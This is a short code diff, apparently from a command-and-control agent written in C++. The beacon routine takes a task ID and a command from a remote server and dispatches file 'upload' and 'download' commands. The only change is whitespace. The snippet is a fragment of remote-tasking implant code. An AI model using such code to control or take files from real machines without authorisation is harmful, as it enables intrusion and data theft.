@@ -199,7 +199,6 @@ const char* Device::get_Arch() {
 }
 
 
-
 void Communicate_::beacon(const char *id) {
     cJSON *bea = cJSON_CreateObject();
     cJSON_AddStringToObject(bea, "mode", "beacon");
@@ -222,7 +221,8 @@ void Communicate_::beacon(const char *id) {
 
     cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
     cJSON *cmd = cJSON_GetObjectItem(reply, "command");
-    // if command = "upload [file path]" | upload file to agent 
+    // if command = "upload [file path]" | upload file to agent
+    
     if (strncmp(cmd->valuestring, "upload", 6) == 0) upload();
     // if command = "download [file path]" | download file from agent
     if (strncmp(cmd->valuestring, "download", 8) == 0) download();
